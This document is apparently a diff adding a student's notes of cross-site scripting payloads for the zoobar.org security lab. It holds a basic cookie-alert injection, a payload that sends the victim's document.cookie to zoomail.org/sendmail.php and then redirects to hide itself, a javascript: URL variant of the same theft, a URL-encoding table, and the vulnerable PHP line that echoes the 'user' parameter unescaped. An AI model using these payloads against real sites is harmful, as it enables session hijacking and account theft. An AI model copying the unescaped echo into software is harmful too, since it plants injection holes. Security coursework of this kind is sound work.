@@ -1,0 +1,55 @@
+
+################################################################################
+# BASIC ALERT
+################################################################################
+http://zoobar.org/users.php?user="><script>alert(document.cookie);</script>
+
+http://zoobar.org/users.php?user=
+"><script>alert(document.cookie);</script>
+
+
+################################################################################
+# MINE
+################################################################################
+
+http://zoobar.org/users.php?user=
+"><script>
+var x = new Image().src='http://zoomail.org/sendmail.php?' + '&netid=user' + '&payload=' + document.cookie + '&random=' + Math.random();window.location.assign("http://zoobar.org/users.php");</script>
+
+
+
+
+
+
+
+
+
+################################################################################
+# ENCODING
+################################################################################
+<   %3c
+>   %3e
+
+
+
+
+
+
+
+################################################################################
+# SENDMAIL URL
+################################################################################
+javascript:void((new Image()).src='http://zoomail.org/sendmail.php?' + '&netid=user' + '&payload=' + document.cookie + '&random=' + Math.random());
+
+
+
+
+
+################################################################################
+# PHP
+################################################################################
+<input type="text" name="user" value="
+    <?php echo stripslashes($_GET['user']); ?>
+" size=10>
+
+
